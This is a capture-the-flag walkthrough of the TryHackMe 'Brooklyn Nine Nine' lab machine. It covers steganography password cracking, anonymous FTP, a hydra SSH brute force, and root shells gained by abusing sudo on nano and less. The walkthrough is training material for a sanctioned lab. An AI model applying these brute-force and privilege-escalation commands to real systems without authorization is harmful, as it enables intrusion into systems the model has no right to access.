 # CTF-Write-up

## Try Hack Me: Brooklyn Nine Nine

##### URL: https://tryhackme.com/room/brooklynninenine

##### Created by _https://tryhackme.com/p/Fsociety2006_

![logo](https://user-images.githubusercontent.com/20625004/115248090-0a67a980-a130-11eb-99af-2edf03ef0eeb.PNG)

You should deploy the machine first.

Add the CTF ip to your host file.

``` echo "CTF ip" >> /etc/hosts```

Run nmap against the target machine.

```nmap -sC -A  <target IP>```

Ports 21, 22 and 80.

Port 80 HTTP.

![port80](https://user-images.githubusercontent.com/20625004/115248763-a5f91a00-a130-11eb-9bce-7050f8db3490.PNG)

Using ``gobuster`` did not show any interesting directories.

Lets view source of the page.

![hint1](https://user-images.githubusercontent.com/20625004/115248917-caed8d00-a130-11eb-8d3b-93690a7de9f2.PNG)

There is a hint that should help you what to do next.

OK lets download the background picture.

``wget http://target IP>/path/to/jpg``

Using the ``steghide`` we understand that something is inside that picture.

![steghide](https://user-images.githubusercontent.com/20625004/115249334-291a7000-a131-11eb-9d2a-a4a82a5c85ae.PNG)

We are using ``stegseek`` tool to crack it. 

``https://github.com/RickdeJager/stegseek``

![crack](https://user-images.githubusercontent.com/20625004/115250673-78ad6b80-a132-11eb-9785-d91fa4448c30.PNG)

We were able to find the password, now we have a username and a password.

Further From the nmap we see anonymous access on FTP service.

There is a file download it.

``mget file``

![ftp](https://user-images.githubusercontent.com/20625004/115248463-616d7e80-a130-11eb-91d5-0abd2e237afc.PNG)

There is a note from Amy.

![amy](https://user-images.githubusercontent.com/20625004/115248607-84982e00-a130-11eb-8b7d-e33e109ca036.PNG)

Now lets access the SSH service with username and password we found earlier.

![holt](https://user-images.githubusercontent.com/20625004/115253928-8c0e0600-a135-11eb-95b7-3f7a7212da0b.PNG)

On Home/User you should find the first flag.

Privilege Escalation use the command ``sudo -l`` to list all the commands that we can execute as root.

![sudo](https://user-images.githubusercontent.com/20625004/115254006-9defa900-a135-11eb-9f5a-023d47ede775.PNG)

We can see that the command ``/bin/nano`` can be executed as 'root' by user XXXX.

Lets search on ``https://gtfobins.github.io/gtfobins/nano/``

![gtfobins](https://user-images.githubusercontent.com/20625004/115254241-d4c5bf00-a135-11eb-9b65-71757d0d1503.PNG)

We need to enter the nano editor with sudo privilege using the command:

``XXXX@brookly_nine_nine:~$ sudo /bin/nano``

Now we press Ctrl+R and then Ctrl+X and then we can execute the command ``reset; sh 1>&0 2>&0`` and we have root shell.

![root](https://user-images.githubusercontent.com/20625004/115254656-3a19b000-a136-11eb-9a2d-ea0d76728e63.PNG)

On root directory you should find the second flag.

Author informed us that there are two ways to enter the system. Lets check again.

From the anonymous FTP we downloaded a txt file with two names inside.

Lets use that information and crack the other SSH user.

First lets use ``hydra`` with the username we found. 

``hydra -l user_name -P /path/to/wordlist ssh://target IP -vv -f``

![ssh](https://user-images.githubusercontent.com/20625004/115255455-f3788580-a136-11eb-8276-cefa916caff2.PNG)

We are using that information and access SSH.

![ssh1](https://user-images.githubusercontent.com/20625004/115255609-1c007f80-a137-11eb-96ab-9ca044cd25a3.PNG)

Success on Home directory you should find the first flag.

Privilege Escalation use the command ``sudo -l`` to list all the commands that we can execute as root.

![sudo1](https://user-images.githubusercontent.com/20625004/115255910-6da90a00-a137-11eb-851b-2e238ba6a0d5.PNG)

Lets search on  ``https://gtfobins.github.io/gtfobins/less/``

Type ``sudo less /etc/profile``

Then enter ``!/bin/sh`` and we have root shell.

![root1](https://user-images.githubusercontent.com/20625004/115257061-6df5d500-a138-11eb-926d-bd178e7a6761.PNG)

And we found the second flag.
